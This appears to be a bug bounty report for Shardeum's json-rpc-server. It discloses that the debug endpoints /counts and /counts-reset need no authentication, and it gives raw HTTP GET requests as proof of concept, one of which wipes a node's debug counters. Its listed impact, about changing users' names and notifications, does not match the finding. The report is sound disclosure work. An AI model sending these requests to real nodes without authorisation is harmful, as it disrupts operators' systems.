# #35598 \[W\&A-Insight] Access to debug endpoints without any protection

**Submitted on Sep 30th 2024 at 10:56:08 UTC by @blocksmith0 for** [**Audit Comp | Shardeum: Ancillaries II**](https://immunefi.com/audit-competition/shardeum-ancillaries-ii-boost)

* **Report ID:** #35598
* **Report Type:** Websites and Applications
* **Report severity:** Insight
* **Target:** <https://github.com/shardeum/json-rpc-server/tree/dev>
* **Impacts:**
  * Changing non-sensitive details of other users (including modifying browser local storage) without already-connected wallet interaction and with up to one click of user interaction: Changing the first/last name of user, Enabling/disabling notifications

## Description

## Vulnerability Details

The following debug endpoints are available without any kind of protection like authentication which enables general public to get access to these endpoints.

This enables anyone to wipe out debug data of any archiver/node on the network.

GET \`/counts\` this endpoint emits the nestedCounters report as an array.

GET \`/counts-reset\` this endpoint resets the internal nestedCounters object.

## Proof of Concept

## Proof of Concept

To get nestedCounters do GET request to the archiver/node.

<http://127.0.0.1:4000/counts>

Request:

\`\`\` GET /counts HTTP/1.1 Host: 127.0.0.1:4000 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,ar;q=0.7 Connection: close \`\`\`

To reset or clear internal nestedCounters do the following GET request to the archiver/node.

<http://127.0.0.1:4000/counts-reset>

\`\`\` GET /counts-reset HTTP/1.1 Host: 127.0.0.1:4000 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,ar;q=0.7 Connection: close \`\`\`
